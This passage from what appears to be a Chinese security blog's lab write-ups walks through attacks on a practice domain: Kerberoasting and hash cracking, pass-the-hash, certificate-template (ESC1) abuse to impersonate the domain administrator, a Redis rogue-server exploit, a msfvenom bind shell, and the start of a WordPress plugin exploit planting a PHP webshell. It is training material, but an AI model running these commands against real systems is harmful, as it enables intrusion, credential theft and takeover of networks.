7e8d7aa2d6d2ed971829227c0e344e84cf6b23c55fdb7a0b2e13004f266f3acac8c95b696faba323da5704e2fcdaa54add1197a0a5f113212f63411e2926b9475fac1fee961a572b1ef78244bc8de6fc9f5d80fc8cefb7071bceb83d6b8f2414b1e1728a20ef9baa8ea43bc18c0ef26083a64cc693ae780e2da71524a6b8c99ab5ba080482b63da2fcccfa516c71f9beac9d038e20a88f20641fe1e71cabcd91e76665cd1f26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><strong><code>impacket-GetUserSPNs</code></strong>：Impacket 工具集中的一款工具，用于枚举域内关联了 SPN 的用户，并可请求其 TGS 票据（用于后续破解哈希）。</li><li><strong><code>-request</code></strong>：触发 TGS 票据请求，工具会获取目标用户的 Kerberos TGS 票据哈希（<code>krb5tgs</code> 类型）。</li><li><strong><code>-dc-ip 172.22.9.7</code></strong>：指定域控制器（DC）的 IP 地址（避免 DNS 解析依赖）。</li><li><strong><code>xiaorang.lab/zhangjian:i9XDE02pLVf</code></strong>：域用户认证信息，格式为 <code>域名/用户名:密码</code>。</li><li></li></ul><ol><li><p><strong>枚举 SPN</strong>：查询 <code>zhangjian</code> 关联的所有 SPN（如 <code>HTTP/server01.xiaorang.lab</code> 等）。</p></li><li><p><strong>请求 TGS 票据</strong>：针对每个 SPN，使用用户密码 <code>i9XDE02pLVf</code> 向 DC 认证，获取加密的 TGS 票据（哈希值）。</p></li><li><p><strong>输出哈希</strong>：将 TGS 票据哈希以 <code>hashcat</code> 可识别的格式（如 <code>-m 13100</code> 类型）输出，用于后续破解（若密码复杂，可通过字典攻击还原）。</p><pre class="line-numbers language-none"><code class="language-none">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$[哈希值1]$[哈希值2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><strong><code>krb5tgs</code></strong>：标识这是 Kerberos TGS 票据的哈希。</li><li><strong><code>23</code></strong>：表示加密算法为 <strong>RC4-HMAC</strong>（etype 23），这是一种相对脆弱的加密方式，使得哈希可被破解。</li><li><strong><code>zhangxia</code></strong>：关联的域用户名（即该票据属于域用户 <code>zhangxia</code>）。</li><li><strong><code>XIAORANG.LAB</code></strong>：Active Directory 域名（域环境的名称）。</li><li><strong><code>xiaorang.lab/zhangxia</code></strong>：服务主体名称（SPN），表示该票据对应的服务实例（此处 SPN 格式为 <code>域名/用户名</code>，可能是一个自定义服务或用户关联的特定服务）。</li><li><strong>后续长字符串</strong>：RC4-HMAC 加密的票据数据（包含用用户密码哈希加密的部分，破解后可得到用户明文密码）。</li></ol></li></ol></blockquote><p>然后使用hashcat进行破解</p><pre class="line-numbers language-none"><code class="language-none">┌──(q1n9㉿LAPTOP-3H92FD9J)-[~]└─$ hashcat -a 0 -m 13100 --force 1.txt /usr/share/wordlists/rockyou.txthashcat (v6.2.6) starting<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><ul><li><code>-a 0</code>：字典攻击模式。</li><li><code>-m 13100</code>：指定哈希类型为 Kerberos TGS etype 23。</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d0fd4b1071a320cc38277efa0bbc958b.png"></p><p><code>MyPass2@@6</code></p><pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/tools/Stotaway-bin/linux_x64_agent /tmp/1/linux_x64_agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">39.99.137.92./windows_x64_admin.exe -c 39.99.137.92:7870 -s 123./linux_x64_agent -l 7870 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ce0eefc91f9cf479ce18609a0746c087.png"></p><p>提不了权</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/597347275186a50a6d0c132e6cb32599.png"></p><p>我这里不知道为啥远程链接电脑不行，用的kali远程操作</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/089266cd8855b7947da93fcef8d1dc1a.png"></p><pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26  -codec gbk type C:\Users\administrator\flag\flag03.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1fddf2db6714d97675b6a7523825c22e.png"></p><pre class="line-numbers language-none"><code class="language-none">proxychains /usr/bin/impacket-wmiexec -hashes :2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.7 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7  -codec gbktype C:\Users\administrator\flag\flag04.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f31eee1f1b7f4ff68d37bf9555f79ba5.png"></p><hr><p>或远程</p><pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~]└─# proxychains certipy-ad find -u 'zhangxia@xiaorang.lab' -password 'MyPass2@@6' -dc-ip 172.22.9.7 -vulnerable -stdout[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17Certipy v4.8.2 - by Oliver Lyak (ly4k)[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:636  ...  OK[*] Finding certificate templates[*] Found 35 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 13 enabled certificate templates[*] Trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via CSRA[proxychains] Strict chain  ...  127.0.0.1:12345  ...  XIAORANG-DC.xiaorang.lab:135 &lt;--socket error or timeout![!] Got error while trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via CSRA: Could not connect: [Errno 111] Connection refused[*] Trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via RRP[proxychains] Strict chain  ...  127.0.0.1:12345  ...  XIAORANG-DC.xiaorang.lab:445 &lt;--socket error or timeout![!] Got error while trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused[!] Failed to get CA configuration for 'xiaorang-XIAORANG-DC-CA'[proxychains] Strict chain  ...  127.0.0.1:12345  ...  XIAORANG-DC.xiaorang.lab:80 &lt;--socket error or timeout![*] Enumeration output:Certificate Authorities  0    CA Name                             : xiaorang-XIAORANG-DC-CA    DNS Name                            : XIAORANG-DC.xiaorang.lab    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5    Certificate Validity Start          : 2023-07-14 04:33:21+00:00    Certificate Validity End            : 2028-07-14 04:43:21+00:00    Web Enrollment                      : Disabled    User Specified SAN                  : Unknown    Request Disposition                 : Unknown    Enforce Encryption for Requests     : UnknownCertificate Templates  0    Template Name                       : XR Manager    Display Name                        : XR Manager    Certificate Authorities             : xiaorang-XIAORANG-DC-CA    Enabled                             : True    Client Authentication               : True    Enrollment Agent                    : False    Any Purpose                         : False    Enrollee Supplies Subject           : True    Certificate Name Flag               : EnrolleeSuppliesSubject    Enrollment Flag                     : PublishToDs                                          IncludeSymmetricAlgorithms    Private Key Flag                    : ExportableKey    Extended Key Usage                  : Encrypting File System                                          Secure Email                                          Client Authentication    Requires Manager Approval           : False    Requires Key Archival               : False    Authorized Signatures Required      : 0    Validity Period                     : 1 year    Renewal Period                      : 6 weeks    Minimum RSA Key Length              : 2048    Permissions      Enrollment Permissions        Enrollment Rights               : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Domain Users                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Authenticated Users      Object Control Permissions        Owner                           : XIAORANG.LAB\Administrator        Write Owner Principals          : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Administrator        Write Dacl Principals           : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Administrator        Write Property Principals       : XIAORANG.LAB\Domain Admins                                          XIAORANG.LAB\Enterprise Admins                                          XIAORANG.LAB\Administrator    [!] Vulnerabilities      ESC1                              : 'XIAORANG.LAB\\Domain Users' and 'XIAORANG.LAB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>申请 XR Manager 证书模版并伪造域管理员，得到administrator.pfx,然后利用administrator.pfx证书获取 TGT 和 NTLM Hash</p><p>但是要注意，要改一下hosts，不然会超时（超时的话多试几次）</p><pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~]└─# proxychains certipy-ad req -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca "xiaorang-XIAORANG-DC-CA" -template 'XR Manager'  -upn administrator@xiaorang.lab[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:445  ...  OK[*] Successfully requested certificate[*] Request ID is 8[*] Got certificate with UPN 'administrator@xiaorang.lab'[*] Certificate has no object SID[*] Saved certificate and private key to 'administrator.pfx'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到administrator.pfx，使用获得的证书获取域管哈希</p><pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行结果如下</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/44c58a042414af3e47c1ba697a20eeab.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2d9d04b9091b021d3399a345de303431.png"></p><p>但我这边还是不行（，不知道为什么</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/91561282ac42a604c863db1a10552666.png"></p><blockquote><pre class="line-numbers language-none"><code class="language-none">aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>前半段（<code>aad3b435b51404eeaad3b435b51404ee</code>）</strong><br>这是 <strong>NTLM 哈希的固定前缀</strong>（也叫 “NTLM 空密码哈希” 或 “通用 Salt”），本质是 <code>HMAC-MD5</code> 处理后的固定值，常用于标识这是 NTLM 哈希格式。</li><li><strong>后半段（<code>2f1b57eefb2d152196836b0516abea80</code>）</strong><br>这是 <strong>实际的 NTLM 哈希值</strong>，由用户密码经过 NTLM 算法（<code>MD4</code> 或 <code>MD5</code> 变体，因版本而异）计算生成。</li></ul></blockquote><p>然后hash传递就行</p><hr><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/马"msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7654 -f elf -o 7.elfC:/1/7.exeproxychains msfconsoleuse exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset rhost 39.98.109.189set lport 7654runupload /home/kali/7.elf /tmp/7.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 春秋云镜 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>brute4road</title>
      <link href="/2025/08/13/brute4road/"/>
      <url>/2025/08/13/brute4road/</url>
      
        <content type="html"><![CDATA[<h1 id="brute4road"><a href="#brute4road" class="headerlink" title="brute4road"></a>brute4road</h1><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/tools/fscan_all_version/fscan_all_version"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(q1n9㉿LAPTOP-3H92FD9J)-[/mnt/d/软件工具/渗透/tools/tools/fscan_all_version/fscan_all_version]└─$ ./fscan -h 39.98.109.88   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.8.4start infoscan39.98.109.88:21 open39.98.109.88:6379 open39.98.109.88:22 open39.98.109.88:80 open[*] alive ports len is: 4start vulscan[*] WebTitle http://39.98.109.88       code:200 len:4833   title:Welcome to CentOS[+] ftp 39.98.109.88:21:anonymous   [-&gt;]pub[+] Redis 39.98.109.88:6379 unauthorized file:/usr/local/redis/db/dump.rdb(redis未授权)已完成 4/4[*] 扫描结束,耗时: 26.259310048s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>redis未授权，一篇总结文章<a href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/10f7e323626afe475b88d3f1791b75f4.png"></p><p>连redis查看版本号5.0.12 存在主从复制</p><p>打主从复制,脚本链接如下：<a href="https://github.com/n0b0dyCN/redis-rogue-server/blob/master/redis-rogue-server.py">redis-rogue-server/redis-rogue-server.py at master · n0b0dyCN/redis-rogue-server</a></p><p>在vps上操作</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommandcd RedisModules-ExecuteCommand/make<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>make会报错但是一样能打</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/Ridter/redis-rce.gitcd redis-rce/cp ../RedisModules-ExecuteCommand/src/module.so ./pip3 install -r requirements.txt python3 redis-rce.py -r 39.99.134.226 -p 6379 -L 175.27.255.162 -f module.so//python3 redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功拿到shell，然后传个stowaway上去，进行连接</p><pre class="line-numbers language-none"><code class="language-none">python redis-rogue-server.py --rhost 39.98.109.88 --lhost 8.134.149.24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到shell之后输入下面的命令，创建一个伪终端。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li><strong>端口号</strong>：在计算机网络中，端口号的范围是 0 - 65535，其中 0 - 1023 为知名端口（如 80 端口对应 HTTP），1024 - 65535 为动态或私有端口。</li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">linux_x64_agent -l 40004 -s 123./linux_x64_admin -c 39.99.134.226:44443 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在stoawawy起<code>shell</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ede3d54d68ddff42f442db9624353e67.png"></p><p>suid先看看</p><pre class="line-numbers language-none"><code class="language-none">[redis@centos-web01 mz]$ find / -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null/usr/sbin/pam_timestamp_check/usr/sbin/usernetctl/usr/sbin/unix_chkpwd/usr/bin/at/usr/bin/chfn/usr/bin/gpasswd/usr/bin/passwd/usr/bin/chage/usr/bin/base64   （here)/usr/bin/umount/usr/bin/su/usr/bin/chsh/usr/bin/sudo/usr/bin/crontab/usr/bin/newgrp/usr/bin/mount/usr/bin/pkexec/usr/libexec/dbus-1/dbus-daemon-launch-helper/usr/lib/polkit-1/polkit-agent-helper-1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>低权限shell，base64 suid提权<a href="https://gitcode.com/gh_mirrors/ba/base64?utm_source=highlight_word_gitcode&amp;word=base64&amp;isLogin=1">项目首页 - base64:Fast Base64 stream encoder/decoder in C99, with SIMD acceleration - GitCode</a></p><pre class="line-numbers language-none"><code class="language-none">base64 '/home/redis/flag/flag01' | base64 --decode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>前半部分 <code>base64 '/home/redis/flag/flag01'</code>：将文件 <code>flag01</code> 的内容进行 Base64 编码，输出编码后的字符串。</li><li>后半部分 <code>base64 --decode</code>：读取前半部分的输出（编码后的字符串），并对其进行 Base64 解码，还原为原始内容。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/04eeafb630cdbbef1dfed382ed38e0d5.png"></p><hr><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><pre class="line-numbers language-none"><code class="language-none">ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever    inet6 ::1/128 scope host       valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000    link/ether 00:16:3e:28:a6:ef brd ff:ff:ff:ff:ff:ff    inet 172.22.2.7/16 brd 172.22.255.255 scope global dynamic eth0       valid_lft 1892155364sec preferred_lft 1892155364sec    inet6 fe80::216:3eff:fe28:a6ef/64 scope link       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">upload /home/q1n9/fscan /tmp/1/fscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none"> chmod +x  ./fscan ./fscan -h 172.22.2.0/24download /tmp/1/result.txt /home/q1n9/result.txt172.22.2.7:6379 open172.22.2.16:1433 open172.22.2.16:445 open172.22.2.34:445 open172.22.2.18:445 open172.22.2.3:445 open172.22.2.16:139 open172.22.2.18:139 open172.22.2.3:139 open172.22.2.34:139 open172.22.2.34:135 open172.22.2.16:135 open172.22.2.3:135 open172.22.2.16:80 open172.22.2.18:80 open172.22.2.18:22 open172.22.2.7:80 open172.22.2.7:22 open172.22.2.7:21 open172.22.2.3:88 open[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS[*] NetInfo [*]172.22.2.16   [-&gt;]MSSQLSERVER   [-&gt;]172.22.2.16[*] NetInfo [*]172.22.2.3   [-&gt;]DC   [-&gt;]172.22.2.3[*] NetInfo [*]172.22.2.34   [-&gt;]CLIENT01   [-&gt;]172.22.2.34[*] OsInfo 172.22.2.16(Windows Server 2016 Datacenter 14393)[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        [*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393[*] OsInfo 172.22.2.3(Windows Server 2016 Datacenter 14393)[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393[*] NetBios 172.22.2.34     XIAORANG\CLIENT01             [+] ftp 172.22.2.7:21:anonymous    [-&gt;]pub[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">172.22.2.7  完成172.22.2.18 WordPress站点172.22.2.3  DC172.22.2.16 MSSQLSERVER 172.22.2.34 远程桌面服务未启用 NLA 的主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿LAPTOP-3H92FD9J)-[/home/q1n9/马]└─# proxychains wpscan --url http://172.22.2.18[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.17_______________________________________________________________         __          _______   _____         \ \        / /  __ \ / ____|          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \            \  /\  /  | |     ____) | (__| (_| | | | |             \/  \/   |_|    |_____/ \___|\__,_|_| |_|         WordPress Security Scanner by the WPScan Team                         Version 3.8.28       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart_______________________________________________________________[i] Updating the Database ...[proxychains] Strict chain  ...  127.0.0.1:12345  ...  data.wpscan.org:443  ...  OK[i] Update completed.[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK[+] URL: http://172.22.2.18/ [172.22.2.18][+] Started: Tue Aug  5 23:42:42 2025[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OKInteresting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/[+] WordPress readme found: http://172.22.2.18/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24). | Found By: Rss Generator (Passive Detection) |  - http://172.22.2.18/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt; |  - http://172.22.2.18/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;[+] WordPress theme in use: twentytwentytwo | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/ | Last Updated: 2025-04-15T00:00:00.000Z | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt | [!] The version is out of date, the latest version is 2.0 | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2 | Style Name: Twenty Twenty-Two | Style URI: https://wordpress.org/themes/twentytwentytwo/ | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'[+] Enumerating All Plugins (via Passive Methods)[+] Checking Plugin Versions (via Passive and Aggressive Methods)[i] Plugin(s) Identified:[+] wpcargo | Location: http://172.22.2.18/wp-content/plugins/wpcargo/ | Last Updated: 2025-07-23T01:11:00.000Z | [!] The version is out of date, the latest version is 8.0.2 | | Found By: Urls In Homepage (Passive Detection) | | Version: 6.x.x (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt[+] Enumerating Config Backups (via Passive and Aggressive Methods)[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK                  &gt; (0 / 137)  0.00%  ETA: ??:??:??[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK                  &gt; (5 / 137)  3.64%  ETA: 00:00:15[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK                 &gt; (15 / 137) 10.94%  ETA: 00:00:07[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK                 &gt; (40 / 137) 29.19%  ETA: 00:00:03[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.2.18:80  ...  OK                 &gt; (45 / 137) 32.84%  ETA: 00:00:03 Checking Config Backups - Time: 00:00:02 &lt;==================================================&gt; (137 / 137) 100.00% Time: 00:00:02[i] No Config Backups Found.[!] No WPScan API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register[+] Finished: Tue Aug  5 23:42:56 2025[+] Requests Done: 188[+] Cached Requests: 5[+] Data Sent: 45.417 KB[+] Data Received: 22.477 MB[+] Memory used: 276.207 MB[+] Elapsed time: 00:00:13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>扫出来wpcargo插件，存在一个公开poc</p><p><a href="https://www.cnblogs.com/0x28/p/16562596.html">https://www.cnblogs.com/0x28/p/16562596.html</a></p><p>内网WordPress站点存在editor漏洞，对应<a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a">CVE-2021-25003</a>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> binascii<span class="token keyword">import</span> requests<span class="token comment"># This is a magic string that when treated as pixels and compressed using the png</span><span class="token comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span>payload <span class="token operator">=</span> <span class="token string">'2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'</span><span class="token keyword">def</span> <span class="token function">encode_character_code</span><span 